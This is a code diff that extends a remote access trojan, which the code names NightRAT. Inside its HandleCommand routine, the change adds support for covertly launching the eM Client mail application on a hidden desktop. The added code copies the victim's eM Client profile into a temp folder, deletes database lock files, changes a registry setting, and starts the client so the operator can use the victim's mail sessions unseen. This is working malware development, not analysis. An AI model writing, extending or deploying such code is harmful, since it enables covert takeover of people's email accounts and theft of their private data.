@@ -2156,15 +2156,18 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird");
+                              wRequestedPath == L"Thunderbird" ||
+                              wRequestedPath == L"eM Client");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
                             wRequestedPath == L"LibreWolf" ||
                             wRequestedPath == L"Thunderbird");
 
+            bool isEmClient = (wRequestedPath == L"eM Client");
+
             if (isBrowser) {
-                thread([wRequestedPath, copyProfile, isGecko, closeReal]() {
+                thread([wRequestedPath, copyProfile, isGecko, isEmClient, closeReal]() {
                     ensure_desktop();
                     if (!g_hHiddenDesktop) return;
 
@@ -2178,6 +2181,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
+                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2211,6 +2215,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             wchar_t localApp[MAX_PATH] = {0};
                             SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
                             exePath = wstring(localApp) + L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+                        }
+                    } else if (wRequestedPath == L"eM Client") {
+                        exePath = get_app_path(exeName);
+                        if (exePath.empty()) {
+                            exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
+                            if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
                         }
                     } else {
                         exePath = get_app_path(exeName);
@@ -2274,6 +2284,33 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                         profilePath = tempProfileRoot;
 
+                    } else if (isEmClient && copyProfile) {
+                        wchar_t szPath[MAX_PATH];
+                        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) == S_OK) {
+                            wstring sourceUserData = wstring(szPath) + L"\\eM Client";
+                            if (fs::exists(sourceUserData)) {
+                                wchar_t tempPath[MAX_PATH];
+                                GetTempPathW(MAX_PATH, tempPath);
+                                wstring tempProfileRoot = tempPath;
+                                tempProfileRoot += L"NightRAT_emclient_Profile";
+
+                                try {
+                                    if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
+                                } catch (...) {}
+
+                                if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                    send_error("Failed to copy eM Client profile.");
+                                    return;
+                                }
+                                profilePath = tempProfileRoot;
+                            } else {
+                                send_error("eM Client Profile directory not found.");
+                                return;
+                            }
+                        } else {
+                            send_error("Failed to retrieve APPDATA directory.");
+                            return;
+                        }
                     } else if (copyProfile) {
                         wstring sourceUserData = get_browser_profile_path(wRequestedPath);
 
@@ -2319,7 +2356,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
                     }
 
-                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
+                    if (!isGecko && !isEmClient && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
                         wchar_t tempPath[MAX_PATH];
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
@@ -2343,6 +2380,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                         if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
+                        }
+                    } else if (isEmClient) {
+                        // Use /localmutex to prevent single-instance lock/delegation to default desktop
+                        args = L" /localmutex";
+                        if (copyProfile && !profilePath.empty()) {
+                            args += L" /dblocation \"" + profilePath + L"\"";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
@@ -2430,6 +2473,20 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 fs::remove(fs::path(profilePath) / L"lock");
                                 fs::remove(fs::path(profilePath) / L".parentlock");
                                 fs::remove(fs::path(profilePath) / L"xulstore.json");
+                            } else if (isEmClient) {
+                                // eM Client locks usually aren't standard Chromium lock files.
+                                // But they use SQLite and might leave WAL/SHM locks or custom Lock files.
+                                // Clean SQLite write-ahead-logs to prevent startup/recovery crashes.
+                                try {
+                                    for (const auto& entry : fs::recursive_directory_iterator(profilePath)) {
+                                        if (entry.is_regular_file()) {
+                                            wstring ext = entry.path().extension().wstring();
+                                            if (ext == L".wal" || ext == L".shm" || ext == L".lock") {
+                                                fs::remove(entry.path());
+                                            }
+                                        }
+                                    }
+                                } catch (...) {}
                             } else {
                                 fs::remove(fs::path(profilePath) / L"SingletonLock");
                                 fs::remove(fs::path(profilePath) / L"SingletonSocket");
@@ -2463,8 +2520,27 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
 
+                    // For eM Client and other complex assemblies, we should pass the executable's parent directory as the current working directory
+                    wstring workingDir;
+                    try {
+                        workingDir = fs::path(exePath).parent_path().wstring();
+                    } catch (...) {
+                        workingDir = L"";
+                    }
+                    const wchar_t* lpCurrentDirectory = workingDir.empty() ? NULL : workingDir.c_str();
+
+                    if (isEmClient) {
+                        // Force WPF hardware acceleration off on the hidden desktop by setting the registry key temporarily or environment rules
+                        HKEY hKey;
+                        if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+                            DWORD val = 1;
+                            RegSetValueExW(hKey, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
+                            RegCloseKey(hKey);
+                        }
+                    }
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                       0, NULL, NULL, &si, &pi)) {
+                                       0, NULL, lpCurrentDirectory, &si, &pi)) {
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
